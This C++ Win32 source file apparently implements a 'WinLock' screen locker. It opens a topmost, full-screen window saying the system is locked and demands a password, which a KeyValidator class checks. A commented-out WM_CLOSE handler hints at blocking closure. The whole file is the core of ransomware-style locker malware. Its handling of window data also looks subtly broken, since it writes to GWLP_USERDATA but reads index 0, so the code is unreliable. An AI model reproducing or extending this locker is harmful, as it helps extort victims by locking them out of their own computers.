#include <iostream>
#include <windows.h>

#include "WindowsCoordinates.h"
#include "WindowData.h"
#include "KeyValidator.h"

#define ID_UNLOCK_BUTTON 1

LRESULT CALLBACK WindowProc(
    HWND hwnd,
    UINT uMsg,
    WPARAM wParam,
    LPARAM lParam)
{
    const auto* window_data = reinterpret_cast<WindowData*>(GetWindowLongPtr(hwnd, 0));

    switch (uMsg)
    {
    // case WM_CLOSE:
    //     {
    //         return 0;
    //     }
    case WM_COMMAND:
        {
            // "UNLOCK" button
            if (HIWORD(wParam) == BN_CLICKED && LOWORD(wParam) == ID_UNLOCK_BUTTON)
            {
                char buffer[256]{};
                GetWindowTextA(window_data->hEdit, buffer, sizeof(buffer));
                const std::string enteredText = buffer;
                std::cout << enteredText << '\n';

                if (const KeyValidator keyValidator; keyValidator.ValidateKey(enteredText))
                {
                    MessageBoxA(hwnd, "Unlocking..", "Success", MB_ICONINFORMATION);
                    DestroyWindow(hwnd);
                }
                else
                {
                    MessageBoxA(hwnd, "Wrong key", "Error", MB_ICONERROR);
                }
            }
            return 0;
        }
    case WM_DESTROY:
        {
            PostQuitMessage(0);
            return 0;
        }
    }

    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int WINAPI WinMain(
    HINSTANCE hInstance,
    HINSTANCE,
    LPSTR,
    int)
{
#pragma region WindowCreation
    const char CLASS_NAME[] = "WinLockWindow";

    WNDCLASS wc{};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wc.hbrBackground = static_cast<HBRUSH>(GetStockObject(BLACK_BRUSH));

    RegisterClass(&wc);

    WindowData windowData{};

    windowData.hwnd = CreateWindowEx(
        0,
        CLASS_NAME,
        "WinLock Window",
        WS_POPUP,
        CW_USEDEFAULT,
        CW_USEDEFAULT,
        windowData.screenWidth,
        windowData.screenHeight,
        nullptr,
        nullptr,
        hInstance,
        nullptr
    );
    windowData.hLockText = CreateWindowEx(
        0,
        "STATIC",
        "Your system was locked.. You need to enter the password to unlock it.",
        WS_CHILD | WS_VISIBLE | SS_CENTER,
        windowData.screenWidth / 2 - TEXT_WINDOW_WIDTH / 2,
        windowData.screenHeight / 2 - TEXT_WINDOW_HEIGHT / 2 - TEXT_WINDOW_PADDING_BOTTOM,
        TEXT_WINDOW_WIDTH,
        TEXT_WINDOW_HEIGHT,
        windowData.hwnd,
        nullptr,
        hInstance,
        nullptr
    );
    windowData.hEdit = CreateWindowEx(
        0,
        "EDIT",
        "",
        WS_CHILD | WS_VISIBLE | WS_BORDER,
        windowData.screenWidth / 2 - EDIT_WINDOW_WIDTH / 2,
        windowData.screenHeight / 2 - EDIT_WINDOW_HEIGHT / 2 - EDIT_WINDOW_PADDING_BOTTOM,
        EDIT_WINDOW_WIDTH,
        EDIT_WINDOW_HEIGHT,
        windowData.hwnd,
        nullptr,
        hInstance,
        nullptr
    );
    windowData.hUnlockBtn = CreateWindowEx(
        0,
        "BUTTON",
        "UNLOCK",
        WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
        windowData.screenWidth / 2 - UNLOCK_BUTTON_WIDTH / 2,
        windowData.screenHeight / 2 - UNLOCK_BUTTON_HEIGHT / 2,
        UNLOCK_BUTTON_WIDTH,
        UNLOCK_BUTTON_HEIGHT,
        windowData.hwnd,
        reinterpret_cast<HMENU>(1),
        hInstance,
        nullptr
    );

    if (windowData.hwnd == nullptr)
    {
        std::cout << "Window creation failed!" << std::endl;
        return 0;
    }

    SetWindowPos(windowData.hwnd, HWND_TOPMOST, 0, 0, windowData.screenWidth, windowData.screenHeight, SWP_SHOWWINDOW);
    SetWindowLongPtr(windowData.hwnd, GWLP_USERDATA, reinterpret_cast<LONG_PTR>(&windowData));
#pragma endregion

    MSG msg{};
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}